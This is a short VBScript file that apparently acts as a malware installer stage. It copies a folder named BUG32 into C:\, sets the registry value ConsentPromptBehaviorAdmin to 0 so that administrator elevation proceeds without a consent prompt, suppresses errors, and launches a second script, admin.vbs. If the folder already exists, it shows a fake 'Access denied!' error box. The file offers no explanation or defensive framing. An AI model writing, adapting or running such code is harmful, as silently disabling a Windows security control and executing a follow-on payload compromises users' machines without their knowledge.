set x = createobject("Wscript.shell")
set c = createobject("Scripting.FilesystemObject")
set objShell = createobject("Shell.Application")
on error resume next

if c.FolderExists("C:\BUG32") then
msgbox"Access denied!",1+16,"ERROR"
else
c.CreateFolder"C:\BUG32"
wscript.sleep 1000
c.CopyFolder"BUG32", "C:\BUG32"
wscript.sleep 200
x.regWrite"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Consentpromptbehavioradmin","0","REG_DWORD"

x.run "wscript.exe ""C:\BUG32\admin.vbs"""
end if